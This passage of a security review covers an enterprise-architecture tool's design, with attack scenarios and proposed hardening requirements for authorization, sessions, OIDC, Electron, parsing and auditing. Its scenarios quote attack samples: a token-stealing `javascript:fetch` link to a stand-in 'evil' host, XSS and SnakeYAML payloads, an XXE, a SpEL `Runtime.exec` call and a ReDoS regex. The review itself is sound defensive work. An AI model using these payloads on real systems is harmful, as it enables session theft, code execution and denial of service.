- **Attack scenario**: A business analyst writes an Arc42 answer containing `[click](javascript:fetch('https://evil/'+localStorage.token))`, a Mermaid block with `click A href "javascript:..."` or an `%%{init: {"securityLevel":"loose"}}%%` directive, or a draw.io cell `value="<img src=x onerror=...>"` with `html=1`. The CIO opens it in the portal, an admin opens it in the Electron client. In the browser, the script uses the victim's session to call admin APIs; in Electron, if any IPC bridge exposes file system or shell functions (ADR-009 "file system, local Git export"), the XSS becomes code execution on the architect's machine. The draw.io iframe with both `allow-scripts` and `allow-same-origin` served from the app origin can remove its own sandbox. PlantUML `!include http://...` on a self-hosted PlantUML server is an SSRF; a public PlantUML server (`plantuml.com`) receives the confidential diagram source.
- **Recommendation**: Add PR-24 (safe rendering + CSP) and PR-22 (PlantUML server outbound controls). In REQ-068: Mermaid `securityLevel: 'strict'`, init directives disabled; PlantUML server must be operator-hosted (no public default) and run with `PLANTUML_SECURITY_PROFILE=INTERNET` or stricter; in REQ-078: serve draw.io from a separate origin (or `sandbox="allow-scripts"` only), validate `event.origin` and message schema on the postMessage bridge, ship draw.io locally (no `embed.diagrams.net` in Electron), and sanitize rendered SVG with an allowlist sanitizer (e.g. DOMPurify SVG profile) rather than a deny list.

### SEC-19: Electron hardening and update integrity incomplete

- **Severity**: High
- **Category**: weakness
- **Affected artifacts**: ADR-009 "Technology decisions within Electron" (`contextIsolation`, `preload`, `nodeIntegration=false` – good, but nothing on `sandbox`, CSP, navigation, `setWindowOpenHandler`, `shell.openExternal`, `<webview>`, IPC argument validation, Electron fuses, remote content), "Auto-update: `electron-updater` ... GitHub releases or a self-hosted S3 bucket" (no signature/HTTPS requirement), Follow-up "Signing & notarization ... separate documentation task"; ADR-008 offline cache (no encryption, no purge on logout or role loss); token storage in the client unspecified
- **Attack scenario**: (a) A self-hosted update bucket is misconfigured (public write) or served over HTTP inside a corporate network; an attacker replaces `latest.yml` and the installer; `electron-updater` without enforced code-signature verification on Windows/Linux installs it on every architect's machine. (b) XSS from SEC-18 navigates the main window to an attacker page that calls an over-broad preload API (e.g. `writeFile(path, data)`) to drop a startup script. (c) A laptop of an architect who lost the `ISO` role yesterday still contains the offline cache with restricted values in plaintext.
- **Recommendation**: Add PR-25 (runtime hardening and local data) and PR-26 (signed updates). Amend ADR-009 accordingly and make signing a release prerequisite, not a documentation task.

### SEC-20: Development JWT stub and insecure defaults can reach production

- **Severity**: High
- **Category**: weakness
- **Affected artifacts**: ADR-027 §4 ("Auth via OIDC ... is bridged in dev mode with a simplified JWT stub that requires no external OIDC provider locally"; `api` service runs with `profile: dev`), REQ-075 / `docker compose up` as the documented deployment, REQ-156 AC1 (`docker compose up` with the default configuration), REQ-136 (`localAuthEnabled` default `true`), ADR-013 (Swagger UI "non-production only" – how is production detected?)
- **Attack scenario**: A self-hosting SME copies the repository's `docker-compose.yml` to a server – the path REQ-075 and REQ-156 describe. The API runs with the dev profile, the JWT stub accepts any token (or a well-known static key), and anyone on the network obtains full access, including admin endpoints. Default database credentials from the compose file are reused in production.
- **Recommendation**: Add PR-27. Amend ADR-027: the stub must be a separate build artifact or test-only bean, never in the production image; the application refuses to start when the stub is enabled and any non-loopback interface is bound; the shipped compose file for operators uses the production profile and requires secrets via `.env` without defaults.

### SEC-21: Import / file parsing not hardened

- **Severity**: Medium
- **Category**: gap
- **Affected artifacts**: REQ-033 (YAML/JSON, size "TBD (proposal: 1 MB)"), REQ-059 (YAML, 256 KB, ZIP bulk export), REQ-113 (JSON/YAML, 10 MB default), `SystemSettings.maxUploadMb` (l. 1025), `/admin/continuum/import` multipart without size limit (l. 1939), ADR-018 rules import, concept §21.7 BPMN XML import module, REQ-078 draw.io XML; `PropertyDefinition.pattern` (l. 208, 226) and CEL `matches` (ADR-018) are user-supplied regular expressions
- **Attack scenario**: A metamodel package downloaded from a "community library" (REQ-059 Rationale) contains a YAML alias bomb ("billion laughs") or a SnakeYAML global tag (`!!javax.script.ScriptEngineManager [...]`, CVE-2022-1471) – the first exhausts memory, the second executes code if the parser is configured unsafely. A BPMN import with an external entity reads `/etc/passwd` or the application's `.env` (XXE). An admin-defined `pattern: (a+)+$` makes every entity save hang a request thread (ReDoS).
- **Recommendation**: Add PR-28 (safe parsing) and PR-29 (bounded evaluation, also covers regex). Harmonize size limits in one place (REQ-033, REQ-059, REQ-113 and `maxUploadMb` currently disagree).

### SEC-22: CEL evaluation not bounded

- **Severity**: Medium
- **Category**: weakness
- **Affected artifacts**: ADR-018 "CEL Security Context" (timeout via `CompletableFuture.get(100, MILLISECONDS)`; no cost limit, no comprehension/nesting limits, no limit on number of rules), `expression` mode open to "experienced admins" without a defined permission; fallback "Spring Expression Language `SimpleEvaluationContext`"
- **Attack scenario**: A rule-editor writes `entity.architectureDomainIds.map(x, entity.architectureDomainIds.map(y, ...))` or a catastrophic regex in `matches`. `CompletableFuture.get` with timeout returns to the caller but **does not stop** the evaluation thread; the conformance analysis (`/admin/conformance`, evaluated over all entities) spawns thousands of runaway threads and exhausts CPU. If the SpEL fallback is ever used with `StandardEvaluationContext` (common mistake), expressions can call `T(java.lang.Runtime).getRuntime().exec(...)`.
- **Recommendation**: Covered by PR-29. Amend ADR-018: use CEL cost estimation/cost limit (`CelOptions` cost tracking) and comprehension nesting limits at compile time, reject expressions above the budget on save/import, evaluate on a bounded executor; remove the SpEL fallback or restrict it explicitly to `SimpleEvaluationContext.forReadOnlyDataBinding()`.

### SEC-23: No rate limiting or resource quotas

- **Severity**: Medium
- **Category**: gap
- **Affected artifacts**: only ADR-026 Security ("Rate limiting on batch endpoints (configurable)"); none for login, search/autocomplete (REQ-070, 150 ms debounce = up to 7 req/s per user), catalog queries with joins (REQ-046), graph traversal (`/entities/{id}/impact`, "depth configurable"), conformance analysis, SSE connections, exports; batch size inconsistent: REQ-147 "max batch size of 1,000", REQ-154 / `api/openapi.yaml` 500+500, ADR-026 "default 500 items"; UC-06 open question on unlimited result sets
- **Attack scenario**: A low-privileged user or leaked service account loops `/entities/{id}/impact?depth=50` on a hub entity and `POST /entities/batch` with 500 entities × 500 connections; the single PostgreSQL instance saturates and the tool becomes unavailable for all users (REQ-073 availability).
- **Recommendation**: Add PR-30 (non-functional, with numbers). Fix one maximum batch size across REQ-147, REQ-154 and ADR-026.

### SEC-24: No HTTP security baseline (headers, CORS, CSRF, cookies, error handling)

- **Severity**: Medium
- **Category**: gap
- **Affected artifacts**: no requirement for security headers, CORS, cookie attributes, CSRF; REQ-026 relies on "SameSite=Strict is sufficient"; ADR-013 states bearer tokens in `Authorization`, while the sprint plan defers token storage; Electron client origin (`file://` or `app://`) vs CORS undefined; "no stack trace" only in REQ-058 Error Cases; `Problem.detail` (l. 122) free text
- **Attack scenario**: A wildcard CORS policy with credentials (a frequent shortcut to make the Electron client work) lets any website a logged-in architect visits read the API with their cookies. The web portal is framed by a phishing page (clickjacking on "Approve go-live", REQ-086). A 500 response leaks a Hibernate exception with SQL and table names.
- **Recommendation**: Add PR-31 (headers, CORS, CSRF, cookies) and PR-37 (generic error responses).

### SEC-25: SSE stream authorization underspecified

- **Severity**: Low
- **Category**: weakness
- **Affected artifacts**: `/events/stream` (l. 2883–2903), ADR-013 ("SSE at `GET /api/v1/events`"), REQ-152 AC3
- **Attack scenario**: Browser `EventSource` cannot send an `Authorization` header; implementers commonly pass the bearer token as `?access_token=` which then lands in reverse-proxy access logs, where an operator or log pipeline user picks it up. Long-lived streams also continue after logout. Today the stream only carries `i18n_invalidated`/`metamodel_updated`, so impact is low, but concept §21.5 plans entity events on the same channel.
- **Recommendation**: Change in `api/openapi.yaml` and ADR-013: SSE authenticates via the session cookie (web portal) or a short-lived, single-use stream ticket obtained via an authenticated POST; never long-lived tokens in the URL; the server closes streams on session revocation (PR-08); any future data-carrying events must apply PR-04.

### SEC-26: Secrets and encryption key management undefined

- **Severity**: Medium
- **Category**: gap
- **Affected artifacts**: REQ-022 / `local-credential.md` (TOTP secret AES-256-GCM, "key outside the DB" – only notes), REQ-129 ("environment variables or a secrets management system"), `AuthProviderWrite.clientSecret` "Write-only" (storage unspecified), `SystemSettings.licenseKey` returned by `GET /admin/settings` (l. 1027), REQ-147 webhook `secret`, `machine_credentials` (good: argon2id), ADR-024 audit DB password env vars, no key rotation, no statement on secrets in backups
- **Attack scenario**: The TOTP key is set as an environment variable in the same `docker-compose.yml`/`.env` that is backed up together with the database dump. Whoever gets the backup decrypts all TOTP secrets and – with password hashes cracked offline – logs in as anyone. OIDC client secrets stored in plaintext in `auth_providers` are exposed by any SQL injection.
- **Recommendation**: Add PR-32. Remove `licenseKey` from the `SystemSettings` read schema (write-only, return masked).

### SEC-27: REQ-129 encryption requirement contradictory and partly untestable

- **Severity**: Medium
- **Category**: weakness
- **Affected artifacts**: REQ-129 Statement ("All persisted data (database, backups, export files) MUST be encrypted with AES-256") vs Context ("Encryption at the operating system/storage level ... is the operator's responsibility and is not the subject of this REQ"); "SaaS"; REQ-082 Context (backup mechanics are the operator's responsibility; `pg_dump` instructions) vs REQ-129 AC3 ("the backup routine" encrypts); API ↔ database TLS inside a Compose network; no requirement that backups exclude or separately protect key material; no restore-integrity (a restored backup rolls back the audit trail)
- **Attack scenario**: Nobody can verify AC "all persisted data encrypted with AES-256" for a PostgreSQL volume OEA does not control; implementers either skip it or build a homegrown field encryption that breaks JSONB indexing. Operators follow REQ-082's `pg_dump` instructions and store plaintext dumps, believing REQ-129 covers them.
- **Recommendation**: Rewrite REQ-129 into (a) in-transit: TLS ≥ 1.2 for every external listener; DB TLS required when DB is not on the same host/network namespace; (b) at-rest: OEA documents and checks (startup warning) that volume encryption is the operator's duty; OEA itself encrypts only credential secrets (PR-32) and – if it provides a backup command – produces encrypted output with a key not stored alongside; (c) remove "SaaS". Align REQ-082 AC1 to instruct encrypted backups and separate key storage.

### SEC-28: GDPR for personal data of OEA users and modeled persons

- **Severity**: Medium
- **Category**: gap
- **Affected artifacts**: ADR-024 (`actor_name`, `actor_email` NOT NULL, denormalized "even if the person is later anonymized", default retention 7 years), `AuditEvent.actorEmail` returned by `/portal/audit/events` to every portal reader (l. 869–887, 2845), `person.md` (`detailLevel: anonymized` exists but no process), ADR-019 (no purge of soft-deleted entities before v2.0), UC-10/REQ-077 (persons assigned to process tasks = personal data in EA content), concept §20.2 ("Data subject request workflow ... remain in specialized tools" – that is for business data subjects, not for OEA's own users); no requirement for access/erasure/rectification for OEA users; no documented legal basis for 7-year retention of identifiable actors
- **Attack scenario**: A former employee files an Art. 15/17 request. The operator cannot produce an export of their data across persons, audit, entity history and BPMN assignments, and cannot anonymize them because `actor_email` is mandatory and immutable. Meanwhile every portal reader can harvest all user e-mail addresses from `/portal/audit/events` for phishing.
- **Recommendation**: Add PR-33 (data subject rights and minimization) and PR-34 (retention of soft-deleted data). In ADR-024: store `actor_id` plus a pseudonymous, keyed reference; keep `actor_name/email` in a separate, deletable identity table (or allow cryptographic erasure), and document the legal basis (Art. 6(1)(c)/(f), Art. 17(3)(b)) for keeping pseudonymous audit records. Remove `actorEmail` from portal responses.

### SEC-29: Supply chain and release integrity

- **Severity**: Medium
- **Category**: gap
- **Affected artifacts**: `SECURITY.md` "Known Security Aspects" (SBOM, Cosign, reproducible builds all TBD), ADR-009 (code signing as "documentation task"), ADR-018 (`dev.cel:cel` version range `[0.7,0.8)` – floating), `.github/workflows/ci.yml` (no `permissions:` block; actions pinned to mutable major tags; `npm install -g @redocly/cli@latest`), no dependency vulnerability scanning, no secret scanning gate (REQ-129 AC4 requires a secrets scanner but nothing schedules it)
- **Attack scenario**: A compromised version of a transitive npm dependency is published; the floating range or `@latest` pulls it into CI and into the Electron build; the unsigned installer distributed via GitHub releases carries the payload to every architect workstation. Operators cannot tell from an SBOM whether they run an affected Log4j-style component.
- **Recommendation**: Add PR-35 (SBOM, scanning, signed artifacts, pinned dependencies) and PR-36 (CI least privilege).

### SEC-30: Screenshot workflow (ADR-031) runs third-party code with write access to `main`

- **Severity**: Medium
- **Category**: weakness
- **Affected artifacts**: ADR-031 Decision 3–4 and Consequences ("needs write access to `main` (`GITHUB_TOKEN` with `contents: write`)"), commits directly to `main` on every push that changes `frontend/`
- **Attack scenario**: The workflow runs `npm ci`, Storybook and Playwright – hundreds of third-party packages – in a job holding `contents: write`. A malicious package (or a postinstall script) uses the token to push a commit to `main`, bypassing review and branch protection (if the token is allowed to bypass), e.g. altering `api/openapi.yaml` security or the release workflow. Storybook published on GitHub Pages may include mock data copied from real customer repositories.
- **Recommendation**: Covered by PR-36. Amend ADR-031: split into a build job (read-only token, produces screenshots as an artifact) and a minimal commit job that only downloads the artifact and pushes `docs/screens/*.png` (or opens a PR instead of pushing to `main`); restrict the path of committed files; state that mock data must be synthetic.

### SEC-31: OpenAPI security contract incomplete and inconsistent

- **Severity**: Medium
- **Category**: weakness
- **Affected artifacts**: `api/openapi.yaml` – no endpoints for login/callback, logout, token refresh, WebAuthn ceremonies, TOTP enrollment, password change/reset (REQ-031 names `POST /admin/persons/{id}/reset-password`), bootstrapping (REQ-013), person and role management, OAuth2 token endpoint for client credentials (REQ-155), API keys (REQ-002), webhooks (REQ-147); only `bearerAuth` scheme (no `oauth2` clientCredentials flow, no cookie scheme for the portal); `AuthProvider.type: ldap` (l. 982, 994) not covered by ADR-006; no `maxLength` on free-text fields (`name`, `description`, `reason`, `externalId`, `notes`) and no `maxItems` except batch; integer, sequential entity IDs (l. 89–94) contrary to concept §21.3 ("URNs ... not numeric DB IDs")
- **Attack scenario**: Because the auth endpoints are not in the spec-first contract, they are built outside generated interfaces and outside contract tests – exactly where anti-enumeration (REQ-006), CSRF and rate limiting are most needed and most likely to be missed. A 50 MB `description` per entity in a 500-item batch is accepted by schema validation.
- **Recommendation**: Add the auth, identity, service-account token, webhook and role management endpoints to `api/openapi.yaml` before implementation of S1 (walking skeleton includes US-013 and US-001). Remove `ldap` or create an ADR for it. Add `maxLength`/`maxItems` to all request schemas. Decide whether external IDs exposed in the API are URNs/UUIDs (reduces ID enumeration; authorization must still be enforced, PR-03).

### SEC-32: SECURITY.md contact is a placeholder and claims contradict the baseline

- **Severity**: Low
- **Category**: weakness
- **Affected artifacts**: `SECURITY.md` "Secure Reporting Channel" (`security@oea.org (TBD)`, PGP "at go-live", private advisories "if enabled"); "Security Guarantees" ("OIDC/LDAP for AuthN, never local accounts only" contradicts REQ-136 and REQ-009–011; "Encryption at rest ... as standard" contradicts REQ-129 Context)
- **Attack scenario**: A researcher finds a vulnerability in a public 0.x release, finds no working channel, and opens a public issue – a zero-day disclosure for every self-hosted instance. Operators rely on the "never local accounts only" guarantee when deciding to expose the instance.
- **Recommendation**: Enable GitHub private vulnerability reporting now and name it as the primary channel; replace the `TBD` address with a working one or remove it; align the "Security Guarantees" list with the requirements (or mark items as "planned").

## Proposed Requirements

Each proposal covers one concern and is ready for the requirements engineer. Priority uses MoSCoW. IDs are placeholders (PR-NN) – real REQ numbers are assigned on creation. Unless stated otherwise, verification is an automated test in the backend/frontend test suite and part of CI once implementation exists.

### PR-01: Permission model with explicit permission matrix

- **Type**: security · **Priority**: must · **Addresses**: SEC-01 · **Related**: UC-01, UC-04, ADR-006, concept §21.8
- **Statement**: The system MUST define a fixed set of named permissions (at least: `entity:read`, `entity:write`, `entity:delete`, `entity:restore`, `metamodel:write`, `visibility:configure`, `catalog:manage`, `dashboard:manage`, `plateau:go-live`, `audit:read`, `role:assign`, `service-account:manage`, `auth-config:manage`, `settings:manage`) and a matrix mapping each built-in role to permissions; authorization roles MUST be stored separately from business roles modeled as EA content.
- **Acceptance criteria**:
  - AC1: Given the built-in roles `viewer`, `enterprise-architect`, `auditor`, `integration-writer`, `system-admin`, when the permission matrix is retrieved via the admin API, then every role lists its permissions and no permission is granted implicitly by a role hierarchy.
  - AC2: Given an architect with `entity:write` but not `role:assign`, when they create, edit or delete a Role entity or role assignment in the EA model, then no `person_roles` row changes and their effective permissions are unchanged.
  - AC3: Given a custom role created by an admin, when it is saved without an explicit permission list, then it has no permissions.
- **Verification**: test (automated) + inspection of the matrix document

### PR-02: Deny-by-default authorization on every API operation

- **Type**: security · **Priority**: must · **Addresses**: SEC-01, SEC-31 · **Related**: ADR-013, REQ-147
- **Statement**: Every operation in `api/openapi.yaml` MUST declare its required permission(s); the backend MUST reject any request whose principal lacks them with HTTP 403 (or 401 if unauthenticated), and operations without a declaration MUST be rejected for all principals.
- **Acceptance criteria**:
  - AC1: Given the OpenAPI contract, when CI runs, then the build fails if any operation lacks the permission declaration or a `401`/`403` response.
  - AC2: Given a principal with only `entity:read`, when it calls any operation that requires another permission, then the response is 403 with a generic problem body and no state change.
  - AC3: Given a new controller method generated from the contract without a permission mapping in the security configuration, when the integration test suite runs, then a generated "authorization matrix" test fails for that operation.
- **Verification**: test (automated, generated per operation from the contract) + CI lint

### PR-03: Object-level authorization for addressed resources

- **Type**: security · **Priority**: must · **Addresses**: SEC-01, SEC-04, SEC-05 · **Related**: REQ-056, ADR-019
- **Statement**: For every operation that addresses a resource by ID (entity, diagram, dashboard, catalog, saved filter, service account, audit event), the system MUST check that the principal may access that specific object (ownership, scope, deletion state, publication state) and MUST return the same response for "does not exist" and "not permitted" where the existence itself is sensitive.
- **Acceptance criteria**:
  - AC1: Given a personal dashboard of user A, when user B requests its configuration or data by ID on any endpoint (`/views/...`, `/portal/...`, `/dashboards/...`), then the response is 404 (or 403 consistently) and contains no dashboard data.
  - AC2: Given a soft-deleted entity, when a principal without the restore/admin permission requests it by ID or lists with `deleted=true|only`, then it receives 404 and the entity does not appear in the list.
  - AC3: Given an entity write whose reference property points to an entity the writer cannot read, when the write is submitted, then it is rejected with 422 without revealing whether the referenced entity exists.
- **Verification**: test (automated, IDOR test suite over all ID-addressed operations)

### PR-04: Property visibility enforced on every read channel

- **Type**: security · **Priority**: must · **Addresses**: SEC-02, SEC-16, SEC-25 · **Related**: REQ-124–REQ-128, UC-21, ADR-024
- **Statement**: The system MUST apply property visibility (REQ-124–REQ-127) to every channel that outputs property values or values derived from them – entity, catalog, search, history, diff, restore preview, audit, portal, dashboard aggregations, lineage, roadmap, exports, events, webhooks and write responses – and MUST NOT allow filtering, sorting or grouping by a property the principal cannot read.
- **Acceptance criteria**:
  - AC1: Given a viewer without read permission on `securityClassification` of entity 42, when they call `GET /entities/42/history`, `GET /audit/events?entityId=42`, `GET /portal/audit/events?entityId=42` and the restore preview, then no old or new value of that property is present (values `null`, `redacted: true`).
  - AC2: Given the same viewer, when they request a catalog or dashboard with a filter, sort, `groupBy` or aggregation on that property, then the request is rejected with 403 or the property is ignored server-side, and the result does not differ from the result without that property.
  - AC3: Given a webhook registered by a principal without read permission on a property, when that property changes, then the delivered payload does not contain its values.
  - AC4: Given a property with `visibilityMode != public`, when its value is written to `audit.event_changes`, then it is stored encrypted or as a keyed MAC, not in plaintext.
- **Verification**: test (automated; one parametrized test per read endpoint, maintained as part of PR-02's matrix)

### PR-05: Governance of visibility configuration and scoping connections

- **Type**: security · **Priority**: must · **Addresses**: SEC-03 · **Related**: REQ-124, REQ-125, REQ-127, REQ-128, concept §20.11
- **Statement**: Changing `visibilityMode`, allowed roles, the override role list, and creating, changing or deleting connections whose type is used as a `scopingConnectionType`, MUST require dedicated permissions not included in `metamodel:write` or `entity:write`, and MUST be audited.
- **Acceptance criteria**:
  - AC1: Given an architect with `entity:write`, when they create a `DomainAssignment` connection (configured as scoping type) from their own Person to an entity, then the request is rejected with 403.
  - AC2: Given a metamodel editor without `visibility:configure`, when they change `visibilityMode` of a property or add a role to the override list, then the request is rejected with 403.
  - AC3: Given a principal with `visibility:configure`, when they add a role they themselves hold to the override list, then the change is audited with event type `visibility.override-changed` and flagged as self-benefiting.
- **Verification**: test (automated)

### PR-06: Property write protection on all write paths

- **Type**: security · **Priority**: must · **Addresses**: SEC-04 · **Related**: REQ-101, REQ-105, REQ-126, REQ-127, REQ-153, REQ-154
- **Statement**: The system MUST prevent principals from changing property values they are not permitted to write through any path, including full replace (`PUT`), upsert, batch, restore, partial restore, default values and imports; masked values omitted or sent as `null` by such principals MUST be preserved.
- **Acceptance criteria**:
  - AC1: Given an architect without write permission on property P, when they `PUT` the entity with P set to `null` or omitted, then P keeps its previous value.
  - AC2: Given the same architect, when they restore the entity to a version with a different value of P, then P is not restored and the response lists P as "not restored (insufficient permission)".
  - AC3: Given a service account without write permission on P, when a batch item sets P, then that item fails with status `error` (or the whole batch fails if `atomic=true`), and P is unchanged.
- **Verification**: test (automated)

### PR-07: Anonymous access is off by default and explicitly scoped

- **Type**: security · **Priority**: must · **Addresses**: SEC-05 · **Related**: REQ-003, REQ-056, UC-07, ADR-008
- **Statement**: The system MUST require authentication for all API operations except login, health and static assets by default; if the operator enables anonymous portal access, only objects explicitly marked as published MUST be readable by an `anonymous` principal, subject to the same property visibility rules, and the setting change MUST be audited.
- **Acceptance criteria**:
  - AC1: Given a fresh installation, when an unauthenticated client calls any `/portal/*`, `/views/*` or `/entities/*` operation, then it receives 401.
  - AC2: Given anonymous portal access enabled and dashboard D published, when an unauthenticated client requests D and an unpublished dashboard E, then D is returned without restricted properties and E returns 404.
  - AC3: Given anonymous portal access is enabled or disabled, when the setting is saved, then an audit event `settings.anonymous-access-changed` with actor and new value exists and the admin UI shows a warning while it is enabled.
- **Verification**: test (automated) + inspection of default configuration

### PR-08: Session termination and server-side revocation

- **Type**: security · **Priority**: must · **Addresses**: SEC-06, SEC-12, SEC-25 · **Related**: UC-01, REQ-001, REQ-003, REQ-004, REQ-012, REQ-031
- **Statement**: The system MUST provide logout that invalidates the OEA session and refresh token server-side, and MUST revoke all sessions and refresh tokens of a person within 60 seconds when the person leaves the `active` state, loses a role assignment, has a credential revoked, or has the password reset.
- **Acceptance criteria**:
  - AC1: Given a logged-in user, when they log out, then any further request with the previous session cookie, access token or refresh token is rejected with 401, and an audit event `auth.logout` exists.
  - AC2: Given a user with an active session, when an admin sets the person to `inactive` or `offboarded`, then within 60 s all requests of that session (including open SSE streams) are rejected.
  - AC3: Given a user whose role assignment is removed, when they make the next request after at most 60 s, then their effective permissions no longer include that role.
  - AC4: Given an admin password reset (REQ-031), when it completes, then all existing sessions of the target person are revoked.
- **Verification**: test (automated)

### PR-09: Session timeouts and client token storage

- **Type**: security · **Priority**: must · **Addresses**: SEC-06 · **Related**: REQ-001, REQ-012, ADR-008, ADR-009
- **Statement**: The system MUST enforce an OEA-controlled idle timeout and absolute session lifetime independent of IdP token lifetimes, MUST rotate refresh tokens on use with reuse detection, and MUST NOT store session or refresh tokens in `localStorage`/`sessionStorage` (web portal: `HttpOnly`, `Secure`, `SameSite` cookies; Electron: OS-protected storage).
- **Acceptance criteria**:
  - AC1: Given default configuration (idle 30 min, absolute 12 h, operator-configurable within bounds), when a session is idle for longer than the idle timeout or older than the absolute lifetime, then the next request is rejected with 401.
  - AC2: Given a refresh token that has already been used once, when it is presented again, then it is rejected and all tokens of that session family are revoked and an audit event is written.
  - AC3: Given the web portal after login, when the browser storage is inspected, then no access or refresh token is present in `localStorage` or `sessionStorage`.
- **Verification**: test (automated) + inspection (browser storage, Electron storage)

### PR-10: OIDC relying-party hardening and immutable identity binding

- **Type**: security · **Priority**: must · **Addresses**: SEC-07 · **Related**: REQ-001, REQ-004, ADR-006, ADR-009
- **Statement**: The system MUST use the authorization code flow with PKCE (S256) for all interactive clients (Electron per RFC 8252 via system browser and loopback redirect), MUST validate `iss`, `aud`, `exp`, `nbf`, `nonce`, `azp` and the signing algorithm of every ID token, and MUST bind a person to the immutable pair (`iss`, `sub`) instead of mutable claims such as e-mail.
- **Acceptance criteria**:
  - AC1: Given a valid ID token from the configured issuer whose `sub` differs from the stored binding but whose `email` matches a person, when login completes, then no session is created for that person.
  - AC2: Given an ID token with a wrong `aud`, an expired `exp`, a mismatching `nonce`, or `alg: none`/HS256, when login completes, then no session is created.
  - AC3: Given an authorization request without a PKCE `code_challenge`, or a token request with a wrong `code_verifier`, when processed, then authentication fails.
  - AC4: Given first-time linking by e-mail is enabled, when an ID token has `email_verified` false or absent, then no link is created.
- **Verification**: test (automated, against a mock IdP with crafted tokens)

### PR-11: Immutable claim values for remote admin mapping

- **Type**: security · **Priority**: must · **Addresses**: SEC-08 · **Related**: REQ-014, REQ-018, UC-02
- **Statement**: The remote system admin mapping MUST reference an immutable, provider-controlled identifier (e.g. Entra group object ID or app role, Authentik group UUID) and MUST fail closed when the claim is missing or truncated.
- **Acceptance criteria**:
  - AC1: Given the admin enters a value that is not in the identifier format of the selected provider (e.g. a display name), when saving the mapping, then it is rejected with an explanatory message.
  - AC2: Given a token with an Entra groups overage indicator instead of a `groups` claim, when the user logs in, then no admin permission is granted and a warning event is logged.
  - AC3: Given a token from an issuer other than the configured one containing the mapped claim, when login completes, then no admin permission is granted.
- **Verification**: test (automated)

### PR-12: Throttling and lockout for local authentication

- **Type**: security · **Priority**: must · **Addresses**: SEC-09 · **Related**: REQ-006, REQ-009–REQ-011, REQ-013, REQ-030
- **Statement**: The system MUST throttle failed local authentication attempts (password, TOTP, setup token) per account identifier and per source address with progressive delays, MUST apply identical throttling to non-existent identifiers, and MUST limit TOTP verification attempts per login transaction.
- **Acceptance criteria**:
  - AC1: Given 5 consecutive failed password attempts for one username within 15 minutes, when a 6th attempt is made, then it is delayed or rejected for at least the configured backoff, and the response is identical for existing and non-existing usernames.
  - AC2: Given a login transaction in the TOTP step, when 5 wrong codes are entered, then the transaction is invalidated and the password step must be repeated.
  - AC3: Given 100 failed attempts from one IP address across different usernames within 10 minutes, when further attempts arrive, then they are throttled and a security event `auth.throttled` is logged.
- **Verification**: test (automated)

### PR-13: Password storage and password quality

- **Type**: security · **Priority**: must · **Addresses**: SEC-09 · **Related**: REQ-024, REQ-027, REQ-028, REQ-013, `local-credential.md`
- **Statement**: The system MUST hash local passwords (including the system admin password) with argon2id using at least the OWASP-recommended parameters (m ≥ 19 MiB, t ≥ 2, p = 1), MUST rehash on login when parameters are outdated, MUST enforce a minimum length of 12 and a maximum of at least 64 characters, and SHOULD reject passwords contained in a breached-password list.
- **Acceptance criteria**:
  - AC1: Given any stored password credential, when the database is inspected, then the hash string starts with `$argon2id$` and parameters meet the minimum.
  - AC2: Given a stored hash with outdated parameters, when the user logs in successfully, then the hash is replaced with one using current parameters.
  - AC3: Given a 100-character password, when it is set and used for login, then login succeeds and a password differing only in character 80 fails.
  - AC4: Given breached-password checking is enabled, when a password from the configured list (e.g. `Password123!`) is set, then it is rejected.
- **Verification**: test (automated) + DB inspection

### PR-14: TOTP replay protection

- **Type**: security · **Priority**: should · **Addresses**: SEC-09 · **Related**: REQ-010, REQ-022, REQ-030
- **Statement**: The system MUST reject a TOTP code that has already been accepted for the same credential within its validity window.
- **Acceptance criteria**:
  - AC1: Given a TOTP code that was just used for a successful login, when it is submitted again in a second login within the same 90-second window, then the second login fails.
  - AC2: Given two TOTP credentials of the same person, when a code is accepted for credential A, then the stored last-used time step of A is updated and B is unaffected.
- **Verification**: test (automated, controlled clock)

### PR-15: MFA for privileged accounts

- **Type**: security · **Priority**: must · **Addresses**: SEC-10 · **Related**: REQ-013, REQ-020, REQ-029, `system-admin-account.md`
- **Statement**: The local system admin account and every person holding a permission of the `admin` class MUST use a second factor (passkey or TOTP) for local logins after the first bootstrap login; role-based 2FA exemptions MUST NOT apply to such persons, and a person is exempt only if all of their roles are exempt.
- **Acceptance criteria**:
  - AC1: Given a freshly bootstrapped local system admin, when they complete the first login, then they are required to enroll a second factor before any administrative action is possible.
  - AC2: Given `twoFactorExemptRoles` contains a role with `admin` permission, when the configuration is saved, then it is rejected.
  - AC3: Given a person with one exempt and one non-exempt role, when they log in locally, then a second factor is required.
- **Verification**: test (automated)

### PR-16: Re-authentication and notification for sensitive account actions

- **Type**: security · **Priority**: should · **Addresses**: SEC-11 · **Related**: REQ-026, REQ-031, REQ-155
- **Statement**: The system MUST require a fresh authentication (within the last 5 minutes, configurable) before adding or removing authentication methods, changing the own password, creating or rotating service account secrets and changing authentication provider configuration, and MUST notify the affected person in-app when an authentication method is added or removed.
- **Acceptance criteria**:
  - AC1: Given a session authenticated 30 minutes ago, when the user tries to register a new passkey, then the system requires re-authentication before the registration ceremony starts.
  - AC2: Given an admin session older than 5 minutes, when the admin rotates a service account secret, then re-authentication is required.
  - AC3: Given a new TOTP credential added to a person, when that person next logs in, then a notice lists the new credential with time and label, and an audit event exists.
- **Verification**: test (automated)

### PR-17: Account recovery and temporary password lifecycle

- **Type**: security · **Priority**: must · **Addresses**: SEC-12 · **Related**: UC-02 (E4), UC-03, REQ-024, REQ-031
- **Statement**: Initial and admin-reset passwords MUST expire after a configurable period (default 72 h), MUST be usable only to reach the mandatory password change, and the system MUST provide an audited recovery path for lost second factors (recovery codes or admin-initiated factor reset) and an audited break-glass procedure for complete admin lockout.
- **Acceptance criteria**:
  - AC1: Given an initial password set 73 hours ago and never used, when the person tries to log in with it, then login fails and the admin must issue a new one.
  - AC2: Given a person logging in with an initial or reset password, when authentication succeeds, then no application access is possible until a new password is set.
  - AC3: Given an admin with `admin` permission resets the password of another person with `admin` permission, when the request is made, then it is rejected unless performed by the system admin account, and every reset is audited.
  - AC4: Given complete admin lockout (UC-02 E4), when the documented break-glass CLI command is run on the host, then it creates a time-limited recovery credential and writes an audit event.
- **Verification**: test (automated) + inspection of operator documentation

### PR-18: Audit store tamper resistance

- **Type**: compliance · **Priority**: must · **Addresses**: SEC-13 · **Related**: REQ-083, REQ-151, ADR-024, ADR-026
- **Statement**: The audit store MUST be owned by a database role different from the application runtime role, MUST enforce a minimum retention that cannot be reduced through the application, MUST provide tamper evidence in all editions (hash chain or external append-only export), and MUST record actor and agent identity only from authenticated principals.
- **Acceptance criteria**:
